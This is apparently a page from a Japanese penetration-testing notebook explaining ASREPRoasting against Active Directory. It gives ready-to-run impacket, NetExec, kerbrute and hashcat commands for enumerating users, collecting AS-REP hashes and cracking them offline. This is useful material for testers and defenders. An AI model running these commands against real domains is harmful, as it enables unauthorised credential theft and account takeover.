# ASREPRoasting

## 概要

Kerberos の事前認証（Pre-Authentication）が無効化されているアカウントは、認証情報なしで AS-REP メッセージを取得できる。この AS-REP はアカウントのパスワードで暗号化されているため、オフラインでクラックできる。

---

## 着火条件

- ドメインに `UF_DONT_REQUIRE_PREAUTH` が設定されたアカウントが存在する
- ユーザーリストが入手できている（匿名列挙またはLDAP列挙から）

**認証情報が不要**（匿名でも実施可能）なため、初期アクセス前から試せる。

---

## 観点・着眼点

事前認証無効のアカウントは通常の設定ではないため、意図的または誤設定で設定されている。古い Kerberos クライアントとの互換性のために設定されることがある。

---

## 手順

### ユーザーリストを使った AS-REP の取得（認証情報なし）

```bash
impacket-GetNPUsers \
  '[DOMAIN]/' \
  -usersfile users.txt \
  -no-pass \
  -dc-ip [DC_IP] \
  -format hashcat \
  -outputfile asrep_hashes.txt
```

### 認証済みユーザーで全アカウントを確認

```bash
impacket-GetNPUsers \
  '[DOMAIN]/[USER]:[PASSWORD]' \
  -dc-ip [DC_IP] \
  -request \
  -format hashcat \
  -outputfile asrep_hashes.txt
```

### NetExec を使用

```bash
netexec ldap [DC_IP] -u [USER] -p '[PASSWORD]' --asreproast asrep.txt
```

---

## ユーザーリストの作成（認証情報がない場合）

**Kerbrute でユーザーを列挙：**
```bash
kerbrute userenum \
  --dc [DC_IP] \
  -d [DOMAIN] \
  /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt \
  -o valid_users.txt
```

**一般的な AD ユーザー名の形式：**
```
administrator
guest
[firstname].[lastname]
[f][lastname]
[firstname][l]
```

---

## ハッシュのクラック

取得したハッシュ（`$krb5asrep$23$...` 形式）を hashcat でクラック：

```bash
hashcat -m 18200 asrep_hashes.txt /usr/share/wordlists/rockyou.txt
```

→ 詳細: `../../05_Tools_Reference/Hashcat.md`

---

## 注意点・落とし穴

- 失敗した場合（`UF_DONT_REQUIRE_PREAUTH` が設定されたアカウントなし）は潔く諦める。無理に試行を繰り返すとアカウントロックのリスクがある
- ユーザーリストが不正確だと偽陰性が多くなる

---

## 関連技術
- ユーザー列挙 → `../../01_Reconnaissance/LDAP_Enumeration.md`
- ハッシュのクラック → `../../05_Tools_Reference/Hashcat.md`
- Kerberoasting との違い → `Kerberoasting.md`（こちらは認証情報が必要、SPN付きアカウントが対象）
